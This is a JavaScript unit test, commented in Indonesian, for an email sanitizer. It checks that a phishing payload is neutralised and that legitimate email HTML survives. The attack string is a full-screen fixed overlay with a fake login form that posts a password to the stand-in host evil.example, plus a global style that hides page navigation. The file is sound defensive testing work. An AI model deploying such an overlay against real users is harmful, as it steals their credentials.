// Isolasi HTML email: payload phishing dari review (style global + form login
// palsu fixed full-screen) harus dinetralkan; email sah tetap utuh.
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import createDOMPurify from 'dompurify';
import {
  scopeSelectorList, neutralizeStyleText, scopeEmailStyles, sanitizeEmailHtml, EMAIL_FORBID_TAGS,
} from '../src/lib/emailIsolation.js';
import { PURIFY_CONFIG } from '../src/lib/pasteUtils.js';

// ── Fungsi murni ──────────────────────────────────────────────────────────────
assert.equal(scopeSelectorList('aside, nav'), '.email-body aside, .email-body nav');
assert.equal(scopeSelectorList('body'), '.email-body');
assert.equal(scopeSelectorList('body .x, :root p'), '.email-body .x, .email-body p');
assert.equal(neutralizeStyleText('color:red;position:fixed;inset:0'), 'color:red;position: static;inset:0');
assert.equal(neutralizeStyleText('position : sticky'), 'position: static');
assert.equal(neutralizeStyleText('position:relative'), 'position:relative');
assert.equal(scopeEmailStyles('a{color:red}'), typeof globalThis.CSSStyleSheet !== 'function' ? '' : scopeEmailStyles('a{color:red}'),
  'tanpa CSSOM → style dibuang (aman)');

// ── DOMPurify nyata (jsdom) ───────────────────────────────────────────────────
const { window } = new JSDOM('');
const purify = createDOMPurify(window);
const attack = '<p>Hi</p><style>aside,nav{display:none!important}</style>'
  + '<div style="position:fixed;inset:0;z-index:99999"><form action="https://evil.example/c">'
  + '<input type="password" name="p"><button>Masuk</button></form></div>';
const out = sanitizeEmailHtml(purify, attack, PURIFY_CONFIG);
assert.ok(!/<form|<input|<button/i.test(out), `form/input/button dibuang: ${out}`);
assert.ok(!/position\s*:\s*fixed/i.test(out), `position:fixed dinetralkan: ${out}`);
assert.ok(!/display:none!important/.test(out) || /\.email-body/.test(out), 'style tidak bocor global (dibuang atau di-scope)');
assert.ok(out.includes('<p>Hi</p>'), 'konten sah tetap ada');

// Email sah: tabel, gambar, link tetap
const legit = '<table width="600"><tr><td bgcolor="#eee"><a href="https://ok.example" target="_blank">Link</a>'
  + '<img src="https://ok.example/a.png" width="100"></td></tr></table>';
const legitOut = sanitizeEmailHtml(purify, legit, PURIFY_CONFIG);
assert.ok(/<table[^>]*width="600"/.test(legitOut) && /<a [^>]*href="https:\/\/ok\.example"/.test(legitOut) && /<img /.test(legitOut),
  `email sah utuh: ${legitOut}`);

// Hook dilepas setelah sanitize — sanitize biasa (compose/paste) tidak terpengaruh.
const plain = purify.sanitize('<div style="position:fixed">x</div>', PURIFY_CONFIG);
assert.match(plain, /position:fixed/, 'hook isolasi tidak menempel ke sanitize lain');
assert.ok(EMAIL_FORBID_TAGS.includes('form'));

console.log('✅ test-email-isolation: semua lolos');
